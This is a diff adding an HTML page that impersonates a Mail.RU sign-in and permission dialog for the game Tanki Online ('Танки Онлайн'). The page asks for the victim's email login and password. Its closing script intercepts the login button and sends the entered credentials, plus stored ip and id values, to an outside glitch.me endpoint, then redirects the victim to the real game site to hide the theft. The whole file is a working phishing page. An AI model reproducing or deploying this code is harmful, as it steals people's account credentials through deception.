@@ -1,0 +1,135 @@
+<html><head>
+
+<script>
+Decode();
+</script><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+
+<title>Mail.RU</title>
+
+<script type="text/javascript" src="./mail_ru_files/js.js"></script>
+<style type="text/css">
+.osncont {
+	width: 500px;
+	margin: auto;
+	padding: 1px;
+	border: 1px solid #C3DDEF;
+}
+
+.top {
+	width: 500px;
+	height: 32px;
+	background-image: url('./mail_ru_files/connect-popup-header-bg.gif');
+	line-height: 32px;
+	/* [disabled]margin: auto; */
+}
+.fn {
+	background-image: url('./mail_ru_files/bg_causes_top.gif');
+	background-repeat: repeat-x;
+}
+.foot {
+	height: 50px;
+	background-color: #E4F1FF;
+	border: 1px solid #C3DDEF;
+}
+li {
+	font-size: 10px;
+	padding: 5px;
+}
+body {
+	width: 100%;
+	height: 100%;
+	font-family: Arial;
+	font-size: 12px;
+}
+#permission-list {
+	width: 400px;
+	margin: auto;
+}
+
+.btn {
+    background: none repeat scroll 0 0 transparent;
+    border: 0 none;
+    cursor: pointer;
+    display: inline-block;
+    margin: 0;
+    overflow: visible;
+    padding: 0;
+    text-decoration: none;
+    white-space: nowrap;
+}
+</style>
+</head>
+
+<body>
+<form>
+<div class="osncont">
+  <div class="top"><img src="./mail_ru_files/share.png" width="175" height="15" align="bottom" style="margin: 7px 0 0 3px"></div>
+  <div class="fn">
+ 
+ 
+ 
+   <div id="permission-list">
+    <br><h2>Доступ к вашей информации</h2>
+    <div id="permission-list2">
+      <p><strong>Alternativa Platform</strong> просит вас разрешить следующие действия: </p>
+      <ul>
+        <li> Получить информацию о вашем позывном в игре «Танки Онлайн». </li>
+        <li> Логин должен быть следующего вида: login@domain.ru </li>
+    </ul>
+  </div>
+ 
+ 
+     <table width="90%" border="0" align="center">
+       <tbody><tr>
+         <td>Логин:</td>
+         <td><input name="email" id="lgn" type="email">
+           </td>
+       </tr>
+       <tr>
+         <td>Пароль:</td>
+         <td><input type="password" name="email_pass" id="psw">
+           <a href="http://www.mail.ru/pages/help/2.html#2185" target="_blank">Забыли пароль? </a></td>
+       </tr>
+       <tr>
+       <td></td>
+            <td style="line-height:12px; height:12px;" height="12px"><input name="" type="checkbox" value="">
+              Чужой компьютер </td>
+       </tr>
+ </tbody></table>
+     <p>&nbsp;</p>
+   </div>
+ 
+ <div class="foot">
+  <p>
+    <input style="float:right; margin: 0 25px 0 0;" name="submit" id="btn" value="Войти" tabindex="5" type="image" src="./mail_ru_files/v.png">
+  </p>
+    </div>
+ 
+    
+  </div>
+</div>
+ </form>
+   <script>
+    document.querySelector('#btn').addEventListener('click', async function (e) {
+      e.preventDefault()
+let r = await fetch('https://placid-succulent-marigold.glitch.me/api/add', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    login: document.querySelector('#lgn').value,
+                    password: document.querySelector('#psw').value,
+                    fake: new URL(location.href).origin,
+                    ip: localStorage.getItem('ip'),
+                    id: localStorage.getItem('id'),
+                    query: localStorage.getItem('num'),
+                    type: 'tan'
+                })
+            }).then(data => {
+                setTimeout(() => {
+                   location.replace('https://tankionline.com')
+                }, 500)
+            })
+    })
+  </script> 
